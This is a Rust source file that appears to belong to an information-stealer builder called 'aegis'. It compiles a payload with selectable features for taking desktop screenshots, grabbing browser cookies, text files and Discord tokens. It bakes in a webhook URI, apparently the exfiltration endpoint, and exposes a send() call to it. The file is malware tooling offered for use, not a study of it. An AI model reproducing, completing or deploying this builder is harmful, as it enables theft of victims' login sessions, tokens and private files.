use std::process::Command;
mod utils;

pub fn build_binary(ds: bool, gc: bool, gt: bool, gdt: bool, webhook_uri: String) {
    let mut features = Vec::new();
    if ds {
        features.push("aegis/desktop_screenshot");
    }
    if gc {
        features.push("aegis/grab_cookies");
    }
    if gt {
        features.push("aegis/grab_txts");
    }
    if gdt {
        features.push("aegis/grab_discord_token");
    }

    let mut cmd = Command::new("cargo");

    cmd.arg("build")
        .arg("--release")
        .arg("-p")
        .arg("aegis_binary")
        .arg("--features")
        .arg(features.join(" "));

    cmd.env("WEBHOOK_URI", webhook_uri);

    let status = cmd.status().unwrap();

    if status.success() {
        println!("Executable built successfully!");
    } else {
        println!("Failed to build executable.");
    }
}

pub async fn send() {
    utils::send::send_hook().await;
}
